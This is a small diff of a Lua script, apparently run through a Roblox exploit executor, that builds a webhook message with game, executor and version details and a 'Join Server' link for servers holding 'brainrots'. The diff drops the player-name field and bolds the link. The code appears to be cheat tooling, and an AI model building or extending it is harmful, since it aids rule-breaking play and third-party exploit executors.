@@ -118,10 +118,9 @@ local function sendWebhook(brainrots, link)
         { name = "Roblox Version", value = "```" .. versionString .. "```", inline = true },
         { name = "Executor",       value = "```" .. executorName .. "```", inline = true },
         { name = "Game Version",   value = "```" .. tostring(placeVersion) .. "```", inline = true },
-        { name = "Player",         value = "```" .. playerName .. "```", inline = true },
         { 
             name = "", 
-            value = "[[Join Server]](" .. link .. ")", 
+            value = "**[[Join Server]](" .. link .. ")**", 
             inline = false 
         },
     }
